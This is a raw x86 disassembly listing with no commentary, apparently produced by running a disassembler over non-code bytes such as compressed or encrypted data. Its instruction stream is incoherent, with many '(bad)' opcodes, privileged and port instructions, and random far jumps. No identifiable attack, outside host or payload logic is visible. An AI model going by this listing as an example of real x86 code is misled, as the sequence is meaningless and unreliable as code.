  41d119:	arpl   WORD PTR [ecx+0x515676e3],sp
  41d11f:	js     0x41d167
  41d121:	push   cs
  41d122:	ins    DWORD PTR es:[edi],dx
  41d123:	dec    edx
  41d124:	and    eax,0x19992986
  41d129:	fldcw  WORD PTR [edx]
  41d12b:	das    
  41d12c:	jns    0x41d152
  41d12e:	rcr    edx,0x7f
  41d131:	cmp    ebp,DWORD PTR [edi+ebp*2]
  41d134:	lods   eax,DWORD PTR ds:[esi]
  41d135:	xor    bl,0xea
  41d138:	sti    
  41d139:	xchg   esi,eax
  41d13a:	pop    es
  41d13b:	pop    eax
  41d13c:	neg    ebp
  41d13e:	xchg   ecx,eax
  41d13f:	inc    ebp
  41d140:	adc    ah,cl
  41d142:	pop    ebx
  41d143:	push   edi
  41d144:	xor    ecx,DWORD PTR ds:0x35bb627e
  41d14a:	adc    DWORD PTR ds:0x77149537,ecx
  41d150:	cli    
  41d151:	retf   0x6b6
  41d154:	stc    
  41d155:	mov    ch,0xc6
  41d157:	popf   
  41d158:	rol    DWORD PTR es:[eax+0x76],cl
  41d15c:	mov    ch,0x77
  41d15e:	cdq    
  41d15f:	mov    ?,WORD PTR [ebx+0x46]
  41d162:	mov    cx,0xcd89
  41d166:	pop    esi
  41d167:	pushf  
  41d168:	pop    edi
  41d169:	sub    ah,BYTE PTR [bx+0x1]
  41d16d:	push   esi
  41d16e:	stos   BYTE PTR es:[edi],al
  41d16f:	ret    
  41d170:	mov    cl,0xf5
  41d172:	in     eax,0x1d
  41d174:	mov    ds:0xf2fba048,al
  41d179:	adc    eax,0xaf03abac
  41d17e:	outs   dx,DWORD PTR ds:[esi]
  41d17f:	loop   0x41d1b0
  41d181:	rol    BYTE PTR [ecx],1
  41d183:	jge    0x41d1df
  41d185:	xchg   esp,eax
  41d186:	ret    0xa6f4
  41d189:	cmp    eax,0x9f4d11cb
  41d18e:	xor    DWORD PTR [ebx],ecx
  41d190:	jmp    0xe33467a9
  41d195:	sbb    dl,BYTE PTR [eax+0x32]
  41d198:	aad    0x95
  41d19a:	ret    
  41d19b:	sti    
  41d19c:	xchg   ecx,eax
  41d19d:	xchg   edi,eax
  41d19e:	mov    ecx,0x6694fcdd
  41d1a3:	repnz and cl,BYTE PTR [edi]
  41d1a6:	or     al,0x4d
  41d1a8:	hlt    
  41d1a9:	xchg   edx,eax
  41d1aa:	scas   eax,DWORD PTR es:[edi]
  41d1ab:	sbb    DWORD PTR [esi+ebx*4],edx
  41d1ae:	jno    0x41d21a
  41d1b0:	add    ebx,edi
  41d1b2:	jle    0x41d134
  41d1b4:	ror    DWORD PTR [edx-0x70],1
  41d1b7:	jo     0x41d157
  41d1b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1ba:	int3   
  41d1bb:	sub    eax,0x9acd1aa7
  41d1c0:	add    eax,esi
  41d1c2:	push   ebp
  41d1c3:	cmp    DWORD PTR [edi],ecx
  41d1c5:	cwde   
  41d1c6:	dec    edx
  41d1c7:	cmc    
  41d1c8:	lods   eax,DWORD PTR ds:[esi]
  41d1c9:	inc    edi
  41d1ca:	shl    DWORD PTR [edx],0xbc
  41d1cd:	xchg   DWORD PTR [ebx+0xa6a49a9],esp
  41d1d3:	xchg   ecx,eax
  41d1d4:	adc    DWORD PTR [edx+0x7397e0d3],edi
  41d1da:	hlt    
  41d1db:	repz inc ebx
  41d1dd:	xor    bl,BYTE PTR [ecx-0x360c83e5]
  41d1e3:	fist   WORD PTR [ebp+0xd1c87e6]
  41d1e9:	sti    
  41d1ea:	(bad)  
  41d1eb:	or     bh,BYTE PTR [eax-0x289e553a]
  41d1f1:	dec    edx
  41d1f2:	mov    ebp,0xe72200a9
  41d1f7:	mov    bl,0xd4
  41d1f9:	es push 0xc56135f3
  41d1ff:	clc    
  41d200:	stos   DWORD PTR es:[edi],eax
  41d201:	idiv   dl
  41d203:	outs   dx,BYTE PTR ds:[esi]
  41d204:	jg     0x41d19c
  41d206:	stc    
  41d207:	pop    esi
  41d208:	es addr16 inc esp
  41d20b:	inc    edi
  41d20c:	loop   0x41d25a
  41d20e:	pop    es
  41d20f:	pop    eax
  41d210:	inc    edi
  41d211:	fld    DWORD PTR [ebx+0x6aa3ff0f]
  41d217:	ret    0xcfec
  41d21a:	mov    ch,0xb
  41d21c:	xchg   DWORD PTR [eax+esi*2],ebp
  41d21f:	inc    esp
  41d220:	mov    ah,BYTE PTR [ebx+0x207a7a26]
  41d226:	pop    ss
  41d227:	xor    edx,DWORD PTR ds:0xaf322d5
  41d22d:	pop    ebx
  41d22e:	cdq    
  41d22f:	or     eax,0xea32a0ed
  41d234:	(bad)  
  41d235:	mov    ebp,0xf8ca65e0
  41d23a:	pop    es
  41d23b:	test   eax,0xbd26d2e8
  41d240:	(bad)  
  41d241:	xchg   ebp,eax
  41d242:	dec    eax
  41d243:	push   edx
  41d244:	fisttp WORD PTR [ecx]
  41d246:	clc    
  41d247:	or     DWORD PTR [ebx-0x19],edx
  41d24a:	mov    dl,0x6f
  41d24c:	push   es
  41d24d:	in     al,dx
  41d24e:	mov    ch,0xe2
  41d250:	scas   al,BYTE PTR es:[edi]
  41d251:	test   eax,0x6e623975
  41d256:	push   0xb1ccf7e8
  41d25b:	(bad)  
  41d25c:	jnp    0x41d209
  41d25e:	les    ebx,FWORD PTR [eax]
  41d260:	(bad)  
  41d261:	pop    edx
  41d262:	sub    bl,BYTE PTR [edi+0x5f]
  41d265:	mov    DWORD PTR [ecx-0x10],edi
  41d268:	test   eax,0x5003c841
  41d26d:	sub    ch,BYTE PTR [eax]
  41d26f:	jg     0x41d2d6
  41d271:	mov    al,ds:0xbcbfff30
  41d276:	jecxz  0x41d261
  41d278:	pusha  
  41d279:	mov    eax,ds:0xfff8eaf1
  41d27e:	sbb    DWORD PTR [ebx+esi*4+0x22ea147e],esp
  41d285:	adc    edx,DWORD PTR [esi+edi*8]
  41d288:	inc    esi
  41d289:	cmp    eax,0x520cc544
  41d28e:	loope  0x41d2a9
  41d290:	call   0xd91d1edf
  41d295:	ds mov ah,0xa1
  41d298:	stc    
  41d299:	pop    edx
  41d29a:	sub    al,cl
  41d29c:	sbb    DWORD PTR [ebx],ecx
  41d29e:	push   ss
  41d29f:	call   0x5420:0x108c29ab
  41d2a6:	stc    
  41d2a7:	dec    ebx
  41d2a8:	cmp    BYTE PTR ds:0x2b3c269b,dl
  41d2ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2af:	adc    BYTE PTR [esp+ecx*8+0x3e2feb81],bh
  41d2b6:	sbb    DWORD PTR [ebp+0x43bf36aa],eax
  41d2bc:	jnp    0x41d2e1
  41d2be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2bf:	jno    0x41d30d
  41d2c1:	push   es
  41d2c2:	mov    esi,0x2081c40e
  41d2c7:	adc    eax,0xf7bcb763
  41d2cc:	sub    al,0x8f
  41d2ce:	leave  
  41d2cf:	retf   
  41d2d0:	test   BYTE PTR [edx],al
  41d2d2:	int3   
  41d2d3:	lea    ebx,[edx-0x5f623b04]
  41d2d9:	jmp    0xe2ed:0x7a30e150
  41d2e0:	shl    ebx,cl
  41d2e2:	stc    
  41d2e3:	xchg   edi,eax
  41d2e4:	add    al,0x23
  41d2e6:	sub    bh,BYTE PTR [ebx]
  41d2e8:	mov    esp,0xebbc7178
  41d2ed:	cmp    edi,DWORD PTR [edi+0x33]
  41d2f0:	fadd   QWORD PTR [ebx-0x5d84701f]
  41d2f6:	push   cs
  41d2f7:	xchg   ebp,eax
  41d2f9:	jecxz  0x41d313
  41d2fb:	sbb    BYTE PTR [ebx-0x4e51cc9f],ch
  41d301:	sbb    edi,DWORD PTR [esi-0xb]
  41d304:	fcom   QWORD PTR [edx+0x78]
  41d307:	clc    
  41d308:	cdq    
  41d309:	ins    BYTE PTR es:[edi],dx
  41d30a:	mov    dl,0x30
  41d30c:	repz xor ebx,ebx
  41d30f:	retf   0x45e
  41d312:	test   eax,0xc8ae4feb
  41d317:	inc    esi
  41d318:	fisttp DWORD PTR [edi+esi*4+0x2d]
  41d31c:	clc    
  41d31d:	test   bl,bh
  41d31f:	push   es
  41d320:	push   es
  41d321:	xchg   edi,eax
  41d322:	inc    ecx
  41d323:	int3   
  41d324:	fmul   DWORD PTR [ebp+0x70fa5ab]
  41d32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d32b:	jnp    0x41d2f8
  41d32d:	adc    bl,ah
  41d32f:	sub    edi,DWORD PTR [eax-0x22]
  41d332:	fsubr  st(4),st
  41d334:	(bad)  
  41d335:	outs   dx,BYTE PTR ds:[esi]
  41d336:	es fs push edi
  41d339:	push   ecx
  41d33a:	hlt    
  41d33b:	mov    dl,0x5f
  41d33d:	pop    ebx
  41d33e:	and    BYTE PTR [esi-0x4b812985],ch
  41d344:	push   0x652b74b4
  41d349:	xchg   ecx,ebp
  41d34b:	ret    
  41d34c:	in     al,0xbd
  41d34e:	(bad)  
  41d34f:	push   edi
  41d350:	stos   DWORD PTR es:[edi],eax
  41d351:	jne    0x41d302
  41d353:	add    DWORD PTR [ecx+0x7da36da7],eax
  41d359:	cdq    
  41d35a:	cwde   
  41d35b:	inc    ebx
  41d35c:	fisub  WORD PTR [esp+ecx*8]
  41d35f:	xor    DWORD PTR [ebp+0x74dc37a1],eax
  41d365:	int    0x3f
  41d367:	jecxz  0x41d3b0
  41d369:	(bad)  
  41d36a:	gs retf 0xf0f0
  41d36e:	iret   
  41d36f:	iret   
  41d370:	fucomi st,st(4)
  41d372:	icebp  
  41d373:	sbb    DWORD PTR [ebx],esp
  41d375:	ret    
  41d376:	jp     0x41d344
  41d378:	fsub   QWORD PTR [edi-0x5ce4ebd7]
  41d37e:	pop    ds
  41d37f:	xchg   esi,eax
  41d380:	cmp    eax,0x820d7c30
  41d385:	loope  0x41d3a8
  41d387:	cmp    al,0x1f
  41d389:	jbe    0x41d3d3
  41d38b:	pop    esi
  41d38c:	jp     0x41d3a9
  41d38e:	pop    ebp
  41d38f:	sbb    eax,0x156d9889
  41d394:	jmp    0xb400d431
  41d399:	adc    dh,BYTE PTR [ecx]
  41d39b:	xchg   DWORD PTR [ebp+0xc],edi
  41d39e:	adc    eax,0x8b360e4a
  41d3a3:	es nop
  41d3a5:	inc    ecx
  41d3a6:	xor    al,BYTE PTR [ebp-0x33]
  41d3a9:	imul   ebp,DWORD PTR [edx-0x2e22489f],0x79621fe5
  41d3b3:	mov    bl,0x94
  41d3b5:	es cmp al,0x23
  41d3b9:	pop    esi
  41d3ba:	and    ch,dl
  41d3bc:	mov    bh,0x55
  41d3be:	add    al,0x2d
  41d3c0:	outs   dx,BYTE PTR ds:[esi]
  41d3c1:	push   esi
  41d3c2:	scas   eax,DWORD PTR es:[edi]
  41d3c3:	mov    DWORD PTR [edi-0x6c],esp
  41d3c6:	pop    esp
  41d3c7:	(bad)  
  41d3c8:	call   0x1c1e:0x55b618b8
  41d3cf:	(bad)  
  41d3d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3d1:	sub    eax,0x2a3dcc16
  41d3d6:	mov    ebx,0xf085208e
  41d3db:	pop    esi
  41d3dc:	fbld   TBYTE PTR [edi+0x38]
  41d3df:	cmp    eax,DWORD PTR [ebp+0x4]
  41d3e2:	scas   al,BYTE PTR es:[edi]
  41d3e3:	sub    eax,0x109dbe56
  41d3e8:	nop
  41d3e9:	outs   dx,DWORD PTR ds:[esi]
  41d3ea:	ja     0x41d39d
  41d3ec:	mov    edx,0xe5e1a952
  41d3f1:	data16 aas 
  41d3f3:	sbb    DWORD PTR [edi],ecx
  41d3f5:	mov    DWORD PTR [esi+0x14],ebx
  41d3f8:	mov    bh,0x36
  41d3fa:	test   edi,ecx
  41d3fc:	jnp    0x41d43f
  41d3fe:	add    edi,eax
  41d400:	jb     0x41d453
  41d402:	mov    ebx,0xa101473a
  41d407:	mov    edi,0x1a8652d9
  41d40c:	adc    al,0xf2
  41d40e:	jmp    0x2860b5f
  41d413:	xor    cl,dl
  41d415:	cs fmul DWORD PTR cs:[eax]
  41d419:	or     eax,0xd7aff638
  41d41e:	iret   
  41d41f:	test   BYTE PTR [ebp+0x2b6d738b],al
  41d425:	push   esi
  41d426:	loop   0x41d3cf
  41d428:	int3   
  41d429:	pop    edi
  41d42a:	retf   0xf929
  41d42d:	mov    eax,0x1867032f
  41d432:	push   edx
  41d433:	mov    ds:0x19cb97c4,eax
  41d438:	test   eax,0xc4a28d5c
  41d43d:	mov    gs,WORD PTR [ebx+ecx*4]
  41d440:	das    
  41d441:	ins    BYTE PTR es:[edi],dx
  41d442:	add    esp,esp
  41d444:	sti    
  41d445:	jns    0x41d4a3
  41d447:	mov    esp,0xa657b587
  41d44c:	inc    ebx
  41d44d:	out    0x53,eax
  41d44f:	fs pop edi
  41d451:	mov    ecx,0xb6b2fe7d
  41d456:	cld    
  41d457:	pop    esp
  41d458:	enter  0x81e9,0x97
  41d45c:	aaa    
  41d45d:	jl     0x41d474
  41d45f:	pop    edi
  41d460:	aam    0xe8
  41d462:	test   eax,0x98edd115
  41d467:	jecxz  0x41d44a
  41d469:	and    al,0x5
  41d46b:	or     eax,0xa998a092
  41d470:	sar    BYTE PTR [edi+ebp*1+0x62f34583],cl
  41d477:	dec    edx
  41d478:	pop    esi
  41d479:	fist   WORD PTR [ebx+0xc19d727]
  41d47f:	mov    ds:0x1bd511ba,eax
  41d484:	in     eax,dx
  41d485:	push   0x4ea59c9a
  41d48a:	scas   al,BYTE PTR es:[edi]
  41d48b:	jecxz  0x41d4a3
  41d48d:	test   DWORD PTR [edx+ebp*2+0x7a],eax
  41d491:	inc    ebp
  41d492:	mov    BYTE PTR [eax+0x3f],ah
  41d495:	xchg   ecx,eax
  41d496:	xchg   esp,eax
  41d497:	xchg   ebx,eax
  41d498:	fmul   QWORD PTR [edx-0x69d49b4]
  41d49e:	retf   0x352b
  41d4a1:	cwde   
  41d4a2:	leave  
  41d4a3:	ds loop 0x41d4f4
  41d4a6:	ja     0x41d47d
  41d4a8:	jb     0x41d4b8
  41d4aa:	cmp    eax,0xbf56dee9
  41d4af:	int    0x1a
  41d4b1:	push   0xa71e0f27
  41d4b6:	ret    
  41d4b7:	push   esi
  41d4b8:	pop    es
  41d4b9:	pop    esp
  41d4ba:	(bad)  
  41d4bb:	mov    esi,0xede97061
  41d4c0:	inc    esi
  41d4c1:	iret   
  41d4c2:	pop    edi
  41d4c3:	mov    cs,ebx
  41d4c5:	mov    ecx,0x34b3bf8b
  41d4ca:	mov    ds,ecx
  41d4cc:	std    
  41d4cd:	pop    esp
  41d4ce:	inc    esi
  41d4cf:	out    0x70,al
  41d4d1:	imul   ebp,DWORD PTR [esi],0x39f6ba72
  41d4d7:	ret    
  41d4d8:	imul   eax,edi,0x10082cf7
  41d4de:	idiv   DWORD PTR [edi-0x36b4a490]
  41d4e4:	mov    eax,ds:0x3cc12fe3
  41d4e9:	ins    BYTE PTR es:[edi],dx
  41d4ea:	test   DWORD PTR [ebx-0x7eb05a25],esi
  41d4f0:	outs   dx,DWORD PTR ds:[esi]
  41d4f1:	cmp    BYTE PTR [esi+0x77],al
  41d4f4:	pop    eax
  41d4f5:	xor    eax,0x82db43b9
  41d4fa:	cmp    cl,BYTE PTR [edi]
  41d4fc:	pop    edx
  41d4fd:	xor    edx,ecx
  41d4ff:	mov    ecx,0x81e58cf7
  41d504:	mov    dh,0x8b
  41d506:	dec    ecx
  41d507:	inc    edx
  41d508:	mov    edi,DWORD PTR [edx+0x2f]
  41d50b:	retf   0x7744
  41d50e:	ret    
  41d50f:	gs dec ebx
  41d511:	mov    ds:0xf6679369,al
  41d516:	cmp    edi,DWORD PTR [edi-0xe0e4e6b]
  41d51c:	jae    0x41d4b2
  41d51e:	scas   eax,DWORD PTR es:[edi]
  41d51f:	jmp    0x41d4bf
  41d521:	das    
  41d522:	fidiv  WORD PTR [ecx+0xd]
  41d525:	aam    0x22
  41d527:	jmp    DWORD PTR [esi-0x36]
  41d52a:	int    0xed
  41d52c:	daa    
  41d52d:	scas   eax,DWORD PTR es:[edi]
  41d52e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d52f:	mul    BYTE PTR [esp+eax*2+0x25]
  41d533:	lea    ecx,[ecx+0xe5dc7f2]
  41d539:	add    ebx,DWORD PTR [esi+0x71]
  41d53c:	adc    DWORD PTR [edi],0xe
  41d53f:	iret   
  41d540:	js     0x41d522
  41d542:	sbb    al,0x1f
  41d544:	mov    BYTE PTR [esi+0x18],dh
  41d547:	aad    0xf1
  41d549:	mov    al,0x63
  41d54b:	push   DWORD PTR [edi-0x5e2fa701]
  41d551:	fs pop esp
  41d553:	jecxz  0x41d4e3
  41d555:	jbe    0x41d55d
  41d557:	or     DWORD PTR [eax],edx
  41d559:	mov    edi,0x75f8fd82
  41d55e:	stos   BYTE PTR es:[edi],al
  41d55f:	retf   0x3a5a
  41d562:	dec    ebp
  41d563:	push   es
  41d564:	push   esp
  41d565:	fs cdq 
  41d567:	dec    esi
  41d568:	mov    esi,DWORD PTR [edx]
  41d56a:	out    dx,al
  41d56b:	pop    ds
  41d56c:	xor    eax,0x5c249343
  41d571:	add    eax,0xeba5bb09
  41d576:	xor    DWORD PTR [ebx-0x1fc6a3e3],ebp
  41d57c:	mov    bl,0x9a
  41d57e:	jne    0x41d5b6
  41d580:	jle    0x41d531
  41d582:	sbb    BYTE PTR [esi],0x1
  41d585:	mov    dh,bh
  41d587:	inc    esi
  41d588:	sub    ecx,DWORD PTR [eax]
  41d58a:	inc    ebp
  41d58b:	nop
  41d58c:	iret   
  41d58d:	pop    edx
  41d58e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d58f:	dec    ecx
  41d590:	adc    esi,DWORD PTR gs:[edi-0xe80532e]
  41d597:	sbb    esp,edi
  41d599:	and    ebx,DWORD PTR [eax+ebp*1]
  41d59c:	add    al,0x6d
  41d59e:	repnz aas 
  41d5a0:	fs cmc 
  41d5a2:	addr16 dec edi
  41d5a4:	push   0x23
  41d5a6:	(bad)  
  41d5a7:	retf   
  41d5a8:	popa   
  41d5a9:	xchg   edx,eax
  41d5aa:	pusha  
  41d5ab:	stos   DWORD PTR es:[edi],eax
  41d5ac:	and    eax,0x8ca08b72
  41d5b1:	adc    BYTE PTR [eax-0x6b1c55c3],ah
  41d5b7:	pop    esi
  41d5b8:	push   ebx
  41d5b9:	fs sti 
  41d5bb:	mov    cs,esp
  41d5bd:	call   0x5608ec77
  41d5c2:	mov    eax,ds:0x5729ae2b
  41d5c7:	test   al,0xe
  41d5c9:	add    DWORD PTR [edi],edi
  41d5cb:	(bad)  
  41d5cc:	js     0x41d607
  41d5ce:	ror    BYTE PTR [ebx+eax*8],0xe4
  41d5d2:	nop
  41d5d3:	and    esp,DWORD PTR [ecx]
  41d5d5:	and    eax,eax
  41d5d7:	(bad)  
  41d5d8:	jb     0x41d635
  41d5da:	nop
  41d5db:	pop    edi
  41d5dc:	inc    ecx
  41d5dd:	and    DWORD PTR [ecx+0x9617104],edx
  41d5e3:	cmc    
  41d5e4:	dec    BYTE PTR [edx]
  41d5e6:	shl    ecx,1
  41d5e8:	popa   
  41d5e9:	add    al,0x4f
  41d5eb:	out    0x23,eax
  41d5ed:	fidiv  WORD PTR [edi+ecx*4-0x1a]
  41d5f1:	fstp   QWORD PTR [edx+0x7ce3bbf4]
  41d5f7:	dec    edi
  41d5f8:	xchg   ecx,eax
  41d5f9:	test   BYTE PTR [ebx-0x857256e],al
  41d5ff:	fdivr  QWORD PTR [edx]
  41d601:	dec    esi
  41d602:	out    0xd0,al
  41d604:	and    eax,0xffd5c569
  41d609:	pop    eax
  41d60a:	test   dl,bl
  41d60c:	mov    ecx,0xd0f2dcbb
  41d611:	mov    esi,edx
  41d613:	add    edx,edx
  41d615:	mov    bl,BYTE PTR [edi-0x5b2aae47]
  41d61b:	and    BYTE PTR [ebx-0x68d61c61],ch
  41d621:	sbb    dl,dh
  41d623:	xor    DWORD PTR [ecx],ecx
  41d625:	nop
  41d626:	adc    bh,cl
  41d628:	js     0x41d64b
  41d62a:	adc    al,0x27
  41d62c:	aam    0x75
  41d62e:	sbb    BYTE PTR [esi],0xc4
  41d631:	fadd   st(6),st
  41d633:	xchg   esp,eax
  41d634:	dec    ecx
  41d635:	lahf   
  41d636:	pop    esi
  41d637:	call   0x5826a09c
  41d63c:	call   0xefee2451
  41d641:	loop   0x41d63a
  41d643:	or     eax,0x6af5d498
  41d648:	nop
  41d649:	mov    edi,DWORD PTR [ebp-0x7f32a389]
  41d64f:	lods   eax,DWORD PTR ds:[esi]
  41d650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d651:	pop    ss
  41d652:	test   ah,bl
  41d654:	imul   edx,DWORD PTR [ebp-0x3c],0xbfaf018
  41d65b:	sub    al,0x59
  41d65d:	adc    dl,BYTE PTR [edx+0x15]
  41d660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d661:	jg     0x41d6a4
  41d663:	ins    DWORD PTR es:[edi],dx
  41d664:	inc    ecx
  41d665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d666:	pop    esp
  41d667:	fldenv [edi+edx*1+0x28]
  41d66b:	xor    dl,BYTE PTR [ebx-0x2ec56723]
  41d671:	and    dl,BYTE PTR [eax+0x59]
  41d674:	icebp  
  41d675:	leave  
  41d676:	out    0xd6,eax
  41d678:	pushf  
  41d679:	xchg   edi,eax
  41d67a:	pop    ebp
  41d67b:	dec    edi
  41d67c:	jmp    0x5e11:0x603a23bf
  41d683:	sub    DWORD PTR [eax+0x6e54188],esp
  41d689:	xchg   ebx,eax
  41d68a:	sar    ch,cl
  41d68c:	sti    
  41d68d:	mov    bh,0x1c
  41d68f:	test   al,0x3d
  41d691:	push   ecx
  41d692:	sbb    DWORD PTR ds:0x2828d09,edi
  41d698:	jae    0x41d6fe
  41d69a:	addr16 mov ds:0xab1f,al
  41d69e:	pop    esi
  41d69f:	add    DWORD PTR [ecx-0x4d52c939],esi
  41d6a5:	fcom   DWORD PTR [ecx+eax*4+0x7c5e8985]
  41d6ac:	mov    dh,0x6a
  41d6ae:	pop    edi
  41d6af:	out    0x6c,al
  41d6b1:	dec    BYTE PTR [ebp-0x37ea56f1]
  41d6b7:	jae    0x41d6ee
  41d6b9:	xchg   BYTE PTR es:[ecx+eax*4+0x65014cd3],dh
  41d6c1:	std    
  41d6c2:	clc    
  41d6c3:	sub    dh,dl
  41d6c5:	and    eax,0x7bd1519b
  41d6ca:	mov    al,0x6e
  41d6cc:	cmp    eax,ebx
  41d6ce:	mov    esi,0xc3242ea2
  41d6d3:	ds dec edi
  41d6d5:	sbb    BYTE PTR [ebp+ebx*1-0x53d5558],cl
  41d6dc:	mov    ch,al
  41d6de:	sbb    BYTE PTR [edx+0x7e],dl
  41d6e1:	les    esi,FWORD PTR [eax]
  41d6e3:	loop   0x41d72f
  41d6e5:	outs   dx,DWORD PTR ds:[esi]
  41d6e6:	cmp    edi,DWORD PTR [edx]
  41d6e8:	iret   
  41d6e9:	stc    
  41d6ea:	mov    ds:0xba27d4eb,al
  41d6ef:	cli    
  41d6f0:	cmp    DWORD PTR [ecx+0x5e],esi
  41d6f3:	pop    eax
  41d6f4:	mov    eax,cr0
  41d6f7:	clc    
  41d6f8:	mov    dh,0x52
  41d6fa:	pop    edi
  41d6fb:	xor    BYTE PTR [ebp+edi*1+0x3a],bl
  41d6ff:	jg     0x41d6f5
  41d701:	popf   
  41d702:	inc    eax
  41d703:	lods   eax,DWORD PTR ds:[esi]
  41d704:	sub    eax,0x90e153d3
  41d709:	ret    0xbf86
  41d70c:	icebp  
  41d70d:	pop    edi
  41d70e:	sub    DWORD PTR [edi-0x68261f2a],0x2bf9c59c
  41d718:	adc    al,0x29
  41d71a:	test   BYTE PTR [ecx-0x22],dl
  41d71d:	sbb    DWORD PTR [esi-0x4b237299],esp
  41d723:	or     eax,0x841c84a5
  41d728:	pop    esi
  41d729:	inc    ecx
  41d72a:	inc    edi
  41d72b:	ffree  st(5)
  41d72d:	fst    DWORD PTR [ebp-0x5ff43645]
  41d733:	and    eax,0xe6335a40
  41d738:	and    edi,DWORD PTR [ebx+ebp*1]
  41d73b:	not    cl
  41d73d:	push   edx
  41d73e:	out    dx,eax
  41d73f:	test   al,0xf7
  41d741:	cwde   
  41d742:	xor    BYTE PTR [edi+edx*1-0x14],ah
  41d746:	les    esp,FWORD PTR [ebp-0x34be9a80]
  41d74c:	sub    DWORD PTR [eax-0x78],0x6341bc81
  41d753:	in     al,dx
  41d754:	inc    esp
  41d755:	xor    BYTE PTR [ecx+eax*8+0x6e],cl
  41d759:	mov    BYTE PTR [edx-0x61],ch
  41d75c:	shl    BYTE PTR [ebp+0x1ea781f],0xf0
  41d763:	retf   
  41d764:	or     al,0x70
  41d766:	js     0x41d746
  41d768:	pop    edi
  41d769:	(bad)  
  41d76a:	iret   
  41d76b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d76c:	push   cs
  41d76d:	pop    ebp
  41d76e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d76f:	jb     0x41d7d9
  41d771:	mov    DWORD PTR [edi],ebp
  41d773:	test   BYTE PTR [edi-0xb476fed],dl
  41d779:	gs xor al,0x6e
  41d77c:	aas    
  41d77d:	inc    esp
  41d77e:	add    ecx,edi
  41d780:	sub    ebx,DWORD PTR [edx+0x65]
  41d783:	xlat   BYTE PTR ds:[bx]
  41d785:	scas   al,BYTE PTR es:[edi]
  41d786:	mov    ah,0x3e
  41d788:	and    BYTE PTR [eax+ecx*8-0x6c42c4f9],0x66
  41d790:	retf   
  41d791:	xor    al,0x65
  41d793:	lods   al,BYTE PTR ds:[esi]
  41d794:	repz and dl,0x6e
  41d798:	mov    esp,0x4cb19892
  41d79d:	pop    edi
  41d79e:	mov    eax,0x77b65b5
  41d7a3:	iret   
  41d7a4:	ins    DWORD PTR es:[edi],dx
  41d7a5:	mov    esp,0xa4ef8ed
  41d7aa:	dec    ebp
  41d7ab:	push   cs
  41d7ac:	stos   BYTE PTR es:[edi],al
  41d7ad:	jge    0x41d7e6
  41d7af:	pop    edi
  41d7b0:	stos   BYTE PTR es:[edi],al
  41d7b1:	mov    ecx,0x383250ea
  41d7b6:	ret    0x6307
  41d7b9:	mov    edx,DWORD PTR [edx+0x49]
  41d7bc:	push   esi
  41d7bd:	popf   
  41d7be:	pop    ebp
  41d7bf:	nop
  41d7c0:	hlt    
  41d7c1:	cmp    BYTE PTR [ecx+ebx*1],bh
  41d7c4:	pop    edi
  41d7c5:	mov    ds,WORD PTR [ecx-0x49]
  41d7c8:	mov    DWORD PTR [eax-0x77],esp
  41d7cb:	sub    BYTE PTR [edx],bh
  41d7cd:	shr    BYTE PTR [esi],1
  41d7cf:	inc    esp
  41d7d0:	mov    ds:0x74dd04a2,al
  41d7d5:	push   edx
  41d7d6:	ret    0xae42
  41d7d9:	cmp    esi,DWORD PTR ds:0xcb3d6aef
  41d7df:	push   ss
  41d7e0:	pop    es
  41d7e1:	add    eax,0x7d888b8b
  41d7e6:	mov    edx,0xcf88d0f4
  41d7eb:	js     0x41d854
  41d7ed:	mov    edi,0xa5d829f6
  41d7f2:	dec    ebp
  41d7f3:	ja     0x41d7f0
  41d7f5:	into   
  41d7f6:	xchg   ebx,eax
  41d7f7:	or     dl,BYTE PTR [edi-0x24520e90]
  41d7fd:	ss mov ebx,ss
  41d800:	sbb    DWORD PTR [ebx+0x76713184],0x2702ec46
  41d80a:	pop    edi
  41d80b:	and    ah,bl
  41d80d:	mov    DWORD PTR [ecx+0x1b],ebp
  41d810:	dec    esi
  41d811:	sub    al,0x86
  41d813:	and    dl,dh
  41d815:	cmp    BYTE PTR fs:[edi],dh
  41d818:	fdiv   QWORD PTR [ebx-0x76]
  41d81b:	(bad)  
  41d81d:	aad    0x95
  41d81f:	dec    edx
  41d820:	sti    
  41d821:	int3   
  41d822:	rcl    DWORD PTR [ecx+0x38],0x7d
  41d826:	ltr    WORD PTR [eax+0x18]
  41d82a:	mov    cs,WORD PTR [edx]
  41d82c:	xchg   ecx,eax
  41d82d:	pop    esp
  41d82e:	push   esi
  41d82f:	push   edi
  41d830:	push   0xffffffc2
  41d832:	fld    QWORD PTR [edi+ebx*2]
  41d835:	mov    ds:0x170360e1,al
  41d83a:	ins    DWORD PTR es:[edi],dx
  41d83b:	mov    ds:0x70f3f7f4,eax
  41d840:	lods   eax,DWORD PTR ds:[esi]
  41d841:	mov    al,ds:0x862a96d0
  41d846:	fcom   QWORD PTR [ebp-0x2c]
  41d84a:	mov    bh,0x74
  41d84c:	cs dec ebp
  41d84e:	pop    ss
  41d84f:	xor    DWORD PTR [ebx+0x1605cb47],0xd9b64d7
  41d859:	bound  ebx,QWORD PTR [edi-0x67dc5a01]
  41d85f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d860:	push   0x2b7b0506
  41d865:	test   DWORD PTR [eax],esi
  41d867:	dec    eax
  41d868:	sbb    al,0xfc
  41d86a:	pop    edx
  41d86b:	das    
  41d86c:	js     0x41d814
  41d86e:	jmp    0x41d86d
  41d870:	jge    0x41d7fe
  41d872:	push   ecx
  41d873:	dec    esi
  41d874:	sar    BYTE PTR [edi],0xd0
  41d877:	je     0x41d804
  41d879:	sbb    ebp,DWORD PTR [ecx]
  41d87b:	loopne 0x41d8a5
  41d87d:	std    
  41d87e:	sbb    edx,DWORD PTR [ebx+eax*1-0x7cbefaa7]
  41d885:	int    0x6a
  41d887:	mov    eax,ds:0xcfc6d34e
  41d88c:	imul   DWORD PTR [ecx-0x7]
  41d88f:	or     al,0x13
